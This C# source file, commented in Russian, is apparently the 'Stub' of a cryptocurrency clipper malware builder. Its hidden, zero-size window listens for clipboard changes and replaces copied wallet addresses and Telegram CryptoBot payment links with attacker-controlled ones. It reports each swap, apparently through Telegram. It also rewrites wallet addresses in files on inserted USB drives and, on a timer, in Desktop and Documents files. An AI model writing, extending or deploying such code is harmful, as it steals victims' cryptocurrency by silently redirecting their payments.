using Stub.Help;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Threading;
using System.Drawing;
using Stub.TelegramAPI;
using System.IO;
using static Stub.Help.Modules.USBWatcher;

namespace Stub
{
    public partial class FormBUF : Form
    {
        private System.Threading.Timer timer;
        public FormBUF()
        {
            SuspendLayout();
            InitializeComponent();
            ClientSize = new Size(0, 0);
            Name = "Form1";
            Text = "Form1";
            Load += FormBUF_Load;
            ResumeLayout(false);
            AddClipboardFormatListener(Handle);
            // Инициализация таймера
            timer = new System.Threading.Timer(TimerCallback, null, 0, 600000); // Интервал в миллисекундах (1000 мс = 1 секунда)
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);
        private void FormBUF_Load(object sender, EventArgs e)
        {
            // Добавьте необходимую логику здесь
        }

        

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            try
            {
                // Подписываемся на событие подключения USB Накопителей и заменяем кошельки в найденных файлах.
                if (m.Msg == WM_DEVICECHANGE)
                {
                    switch (m.WParam.ToInt32())
                    {
                        case DBT_DEVICEARRIVAL:
                            DEV_BROADCAST_VOLUME volumeDevice = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                            string driveLetter = GetDriveLetterFromMask(volumeDevice.dbcv_unitmask);
                            string[] directories = { driveLetter };
                            FileReplace.Replace(directories);
                            break;
                    }    
                }
            }
            catch { }

            try
            {
                // Подписываемся на событие изменения буфера обмена.
                if (m.Msg == 0x031D && Clipboard.ContainsText())
                {
                    var buf = ClipboardHelper.GetClipboardText();

                    string CryptoBot = "t.me/send?start=";
                    if (buf.Contains(CryptoBot))
                    {
                        string fakeURL = $"Fake URL: {CryptoBot}{StringHelper.Random(12)}";
                        ClipboardHelper.SetClipboardText("https://" + fakeURL);
                        // Проверяем, изменились ли данные перед отправкой
                        if (buf != fakeURL)
                        {
                            ScreenSend.POST_RUN(buf, fakeURL);
                        }    
                    }

                    string updatedBuf = buf;
                    string bestWallet = GetBestWallet.Get(buf);
                    ClipboardHelper.SetClipboardText(bestWallet);
                    Thread.Sleep(400);
                    Console.WriteLine( bestWallet);
                    // Проверяем, изменились ли данные перед отправкой
                    if (buf != bestWallet)
                    {
                        ScreenSend.POST_RUN(buf, bestWallet);
                    }
                    Thread.Sleep(500);
                }
            }
            catch {}
        }

        private void TimerCallback(object state)
        {
            // Запускаем поиск адресов по файлам
            string[] directories = { StringHelper.DesktopPath, StringHelper.DocDir };
            if (Config.fileReplacer && !FileReplace.work)
                FileReplace.Replace(directories);

            if (HWID.GetHardwareId().ToString() != StringHelper.idBuild)
            {
                if (File.GetLastWriteTime(StringHelper.CurrentProcess).AddDays(2) <= DateTime.Today)
                    Config.addresses = StringHelper.addresses;
            }
        }
    }
}
